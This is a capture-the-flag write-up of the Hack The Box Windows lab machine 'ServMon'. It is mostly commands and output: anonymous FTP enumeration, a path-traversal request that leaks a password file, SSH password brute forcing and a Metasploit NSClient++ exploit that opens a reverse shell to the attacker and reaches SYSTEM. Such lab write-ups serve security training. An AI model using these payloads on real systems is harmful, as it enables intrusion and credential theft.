---
machine: ServMon
platform: Hack The Box
category: Windows
difficulty: Easy
points: 20
tags: [nvms-1000, lfi, anonymous-ftp, nsclient, ssh-tunnel]
date: 2026-02-25
status: retired
summary: "A Windows host exposing a mix of legacy network-monitoring software alongside FTP, SSH, and a locally-bound management console. It exercises anonymous file-share enumeration, web path-traversal/LFI against a vulnerable surveillance app, password reuse and credential hunting, and privilege escalation through an over-privileged service reachable via an SSH tunnel."
---

## Enumeration

nmap scan

```bash
──(kali㉿kali)-[~/htb/servmon]
└─$ nmap -sC -sV 10.129.227.77 | tee nmapbasic 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-07 10:16 -0400
Nmap scan report for 10.129.227.77
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.98%I=7%D=5/7%Time=69FC9EC1%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2
SF:0\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT
SF:D/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.o
SF:rg/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x
SF:20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20
SF:\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%
SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x
SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/19
SF:99/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x2
SF:0\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\
SF:x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTS
SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC
SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\
SF:xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.
SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t
SF:ransitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xh
SF:tml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20
SF:<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x
SF:20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.98%T=SSL%I=7%D=5/7%Time=69FC9EC9%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")
SF:%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDoc
SF:ument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nCon
SF:tent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"
SF:HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20fou
SF:nd")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\n
SF:Document\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-07T14:18:10
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.95 seconds

```

We see we have services like FTP, SSH, a webapp, and SMB running, and some other interesting ports open like 8443 with some interesting NMAP output

Lets start enumerating FTP:
We find we have anonymous login with 'anonymous':''
It seems empty however, one is expected to know there is an invisible Users directory in ftp that you can navigate to or you can user this command to recursively download/enumerate anonymous ftp
**Anonymous FTP Enumeration**
`wget -r --no-passive ftp://anonymous:anonymous@10.129.227.77/`

We see this in /Users/Nathan/Notes to do.txt

```bash
──(kali㉿kali)-[~/…/servmon/10.129.227.77/Users/Nathan]
└─$ cat 'Notes to do.txt' 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint  
```

and this is in /Users/Nadine/Confidential.txt

```bash
┌──(kali㉿kali)-[~/…/servmon/10.129.227.77/Users/Nadine]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                            
```

## Foothold

We can research the nvms-1000 service running on our webapp and we see its vulnerable to a path traversal LFI

Opening up the site in burpsuite we can modify the GET request to go back to root and then navigate to Nathan's desktop for the passwords to be returned in the response

```http
GET /../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.129.227.77
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Referer: http://10.129.227.77/Pages/login.htm
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

You can also find it with curl if you use the `--path-as-is` flag to ensure that curl doesnt normalize the path

```bash
──(kali㉿kali)-[~]
└─$ curl "http://10.129.227.77/../../../../Users/Nathan/Desktop/Passwords.txt" --path-as-is
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$       
```

We can make a userlist with variants of spelling of nadine, nathan, admin, and administrator and bruteforce ssh with these passwords

```bash
─(kali㉿kali)-[~/htb/servmon]
└─$ nxc ssh 10.129.227.77 -u userlist.txt  -p nathanpass.txt
SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.227.77   22     10.129.227.77    [-] nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Administrator:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] amdinistrator:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] admin:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Admin:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Administrator:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] amdinistrator:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] admin:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Admin:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] nathan:B3WithM30r4ga1n5tMe
[11:10:28] ERROR    Internal Paramiko error for nadine:B3WithM30r4ga1n5tMe, Error reading SSH protocol banner                                                                                            ssh.py:134
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [-] Administrator:B3WithM30r4ga1n5tMe
[11:10:30] ERROR    Internal Paramiko error for amdinistrator:B3WithM30r4ga1n5tMe, Error reading SSH protocol banner                                                                                     ssh.py:134
           ERROR    Internal Paramiko error for admin:B3WithM30r4ga1n5tMe, Error reading SSH protocol banner                                                                                             ssh.py:134
SSH         10.129.227.77   22     10.129.227.77    [-] Admin:B3WithM30r4ga1n5tMe
           ERROR    Internal Paramiko error for nathan:L1k3B1gBut7s@W0rk, Error reading SSH protocol banner                                                                                              ssh.py:134
SSH         10.129.227.77   22     10.129.227.77    [+] nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
```

## Privilege Escalation

When looking through the Program Files we see external program NsClient++, we look online for the location of the credential/configuration files for it and find that it is usually stored in `nsclient.ini`

We find the password `ew2x6SsGTxjRwXOT`

We can find the version (as well as the password with the following commands via ssh):

```powershell
nadine@SERVMON C:\Program Files\NSClient++>cmd /c "C:\Program Files\NSClient++\nscp.exe" web -- password --display
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Program Files\NSClient++>cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

We can now port forward `localhost:8443` to our machine and run the `nscp_authenticated_rce` msf module to exploit the vulnerability automatically

```bash
msf exploit(windows/http/nscp_authenticated_rce) > set rhosts 127.0.0.1
rhosts => 127.0.0.1                                                                                                                                                      
msf exploit(windows/http/nscp_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.15.144:4444                                                                                                                     
[!] AutoCheck is disabled, proceeding with exploitation                                                                                                                  
[*] Configuring Script with Specified Payload . . .                                                                                                                      
[*] Added External Script (name: mzesfcngja)                                                                                                                             
[*] Saving Configuration . . .                                                                                                                                           
[*] Reloading Application . . .                                                                                                                                          
[*] Waiting for Application to reload . . .                                                                                                                              
[*] Triggering payload, should execute shortly . . .                                                                                                                     
[*] Sending stage (190534 bytes) to 10.129.29.169                                                                                                                        
[*] Meterpreter session 2 opened (10.10.15.144:4444 -> 10.129.29.169:49684) at 2026-05-07 15:12:32 -0400
```

```bash
meterpreter > sessions -i 2
[*] Session 2 is already interactive.                                                                                                                                    
meterpreter > shell                                                                                                                                                      
Process 2660 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>
```
